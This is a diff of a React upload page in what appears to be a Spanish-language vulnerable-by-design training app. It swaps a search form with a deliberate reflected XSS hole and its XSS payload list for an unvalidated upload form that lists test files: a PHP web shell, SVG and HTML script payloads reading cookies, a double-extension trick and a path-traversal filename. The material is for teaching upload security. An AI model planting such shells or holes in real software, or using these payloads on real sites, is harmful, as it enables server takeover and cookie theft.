@@ -63,65 +63,56 @@ function Upload() {
       </div>
 
       <div className="card">
-        <h2 className="card-title">Búsqueda de Usuarios</h2>
+        <h2 className="card-title">Formulario de Subida</h2>
         
         <form onSubmit={handleSubmit}>
           <div className="form-group">
-            <label htmlFor="search">Término de búsqueda:</label>
+            <label htmlFor="file">Selecciona un archivo:</label>
             <input
-              type="text"
-              id="search"
+              type="file"
+              id="file"
               className="form-control"
-              value={query}
-              onChange={(e) => setQuery(e.target.value)}
-              placeholder="Buscar usuarios..."
+              onChange={handleFileChange}
               required
             />
+            {file && (
+              <p style={{ marginTop: '0.5rem', color: '#666' }}>
+                Archivo seleccionado: <strong>{file.name}</strong> 
+                ({(file.size / 1024).toFixed(2)} KB)
+              </p>
+            )}
           </div>
 
-          <button type="submit" className="btn btn-primary">
-            Buscar
+          <button 
+            type="submit" 
+            className="btn btn-primary" 
+            disabled={uploading || !file}
+          >
+            {uploading ? 'Subiendo...' : 'Subir Archivo'}
           </button>
         </form>
 
-        {results && (
+        {result && (
           <div className="result-box result-success">
-            <h3>Resultados de búsqueda:</h3>
+            <h3>✅ Archivo Subido Exitosamente</h3>
+            <p><strong>Nombre:</strong> {result.filename}</p>
+            <p><strong>Tamaño:</strong> {(result.size / 1024).toFixed(2)} KB</p>
+            <p><strong>MIME Type:</strong> {result.mimetype}</p>
             <p>
-              Buscaste: 
-              {/* VULNERABILIDAD: XSS Reflejado - dangerouslySetInnerHTML renderiza HTML sin escape */}
-              <strong>
-                <span dangerouslySetInnerHTML={{ __html: results.query }} />
-              </strong>
+              <strong>URL Pública:</strong>{' '}
+              <a href={result.url} target="_blank" rel="noopener noreferrer">
+                {result.url}
+              </a>
             </p>
-            <p>Se encontraron {results.count} resultado(s)</p>
+            
+            <div className="alert alert-danger" style={{ marginTop: '1rem' }}>
+              <strong>⚠️ ¡Archivo Accesible Públicamente!</strong><br />
+              El archivo puede ser accedido por cualquiera desde: {result.url}
+            </div>
 
-            {results.results.length > 0 && (
-              <table>
-                <thead>
-                  <tr>
-                    <th>ID</th>
-                    <th>Usuario</th>
-                    <th>Email</th>
-                    <th>Rol</th>
-                  </tr>
-                </thead>
-                <tbody>
-                  {results.results.map((user) => (
-                    <tr key={user.id}>
-                      <td>{user.id}</td>
-                      <td>{user.username}</td>
-                      <td>{user.email}</td>
-                      <td>{user.role}</td>
-                    </tr>
-                  ))}
-                </tbody>
-              </table>
-            )}
-
-            {results.results.length === 0 && (
-              <p>No se encontraron usuarios que coincidan con la búsqueda.</p>
-            )}
+            <div className="code-block">
+              <pre>{JSON.stringify(result, null, 2)}</pre>
+            </div>
           </div>
         )}
 
@@ -134,50 +125,70 @@ function Upload() {
       </div>
 
       <div className="card">
-        <h2 className="card-title">🧪 Payloads de XSS para Probar</h2>
+        <h2 className="card-title">🧪 Archivos Maliciosos para Probar</h2>
         
-        <h3>1. Alert Box Simple</h3>
+        <h3>1. Archivo PHP para Web Shell</h3>
         <div className="code-block">
-          <pre>{`<script>alert('XSS Vulnerable!')</script>`}</pre>
+          <pre>{`Crea un archivo llamado: shell.php
+Contenido:
+<?php system($_GET['cmd']); ?>
+
+Luego accede:
+http://localhost:3000/uploads/shell.php?cmd=ls`}</pre>
         </div>
 
-        <h3>2. Robo de Cookies</h3>
+        <h3>2. Archivo con Doble Extensión</h3>
         <div className="code-block">
-          <pre>{`<script>alert(document.cookie)</script>`}</pre>
+          <pre>{`Crea: archivo.php.jpg
+Algunos servidores mal configurados ejecutarán el PHP`}</pre>
         </div>
 
-        <h3>3. Redirección Maliciosa</h3>
+        <h3>3. Archivo SVG con XSS</h3>
         <div className="code-block">
-          <pre>{`<script>window.location='http://malicious-site.com'</script>`}</pre>
+          <pre>{`Crea un archivo: xss.svg
+Contenido:
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>alert('XSS via SVG')</script>
+</svg>`}</pre>
         </div>
 
-        <h3>4. Inyección de HTML</h3>
+        <h3>4. Archivo HTML con JavaScript</h3>
         <div className="code-block">
-          <pre>{`<img src=x onerror=alert('XSS')>`}</pre>
+          <pre>{`Crea: malicious.html
+Contenido:
+<html><body>
+<script>alert(document.cookie)</script>
+</body></html>`}</pre>
         </div>
 
-        <h3>5. Event Handler XSS</h3>
+        <h3>5. Path Traversal en Nombre</h3>
         <div className="code-block">
-          <pre>{`<svg onload=alert('XSS')>`}</pre>
-        </div>
+          <pre>{`Intenta subir un archivo llamado:
+../../etc/passwd.txt
 
-        <h3>6. XSS con Decodificación HTML</h3>
-        <div className="code-block">
-          <pre>{`<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">`}</pre>
+(Aunque multer previene esto por defecto, 
+servidores mal configurados podrían ser vulnerables)`}</pre>
         </div>
       </div>
 
       <div className="alert alert-warning">
-        <strong>⚠️ Nota de Seguridad:</strong> En una aplicación real, NUNCA uses 
-        <code>dangerouslySetInnerHTML</code> con datos del usuario. Siempre sanitiza 
-        y escapa el contenido. React por defecto escapa el contenido, pero 
-        <code>dangerouslySetInnerHTML</code> bypasea esta protección.
+        <strong>⚠️ Nota de Seguridad:</strong> En producción, SIEMPRE debes:
+        <ul>
+          <li>✅ Validar el tipo de archivo (MIME type Y extensión)</li>
+          <li>✅ Renombrar archivos con nombres aleatorios</li>
+          <li>✅ Guardar archivos fuera del directorio público</li>
+          <li>✅ Escanear archivos con antivirus</li>
+          <li>✅ Limitar el tamaño máximo de archivo</li>
+          <li>✅ No ejecutar archivos subidos directamente</li>
+        </ul>
       </div>
 
       <div className="alert alert-info">
-        <strong>💡 Ejercicio:</strong> Copia los payloads de arriba y pégalos en el 
-        campo de búsqueda. Observa cómo se ejecuta el código JavaScript. Luego, 
-        investiga cómo usar DOMPurify o una librería similar para prevenir estos ataques.
+        <strong>💡 Ejercicio:</strong> Crea los archivos descritos arriba e intenta 
+        subirlos. Observa cómo el servidor los acepta sin validación. Luego intenta 
+        acceder a ellos desde el navegador. Investiga cómo implementar validación 
+        con librerías como <code>file-type</code> y cómo configurar headers de 
+        seguridad como <code>X-Content-Type-Options: nosniff</code>.
       </div>
     </div>
   );
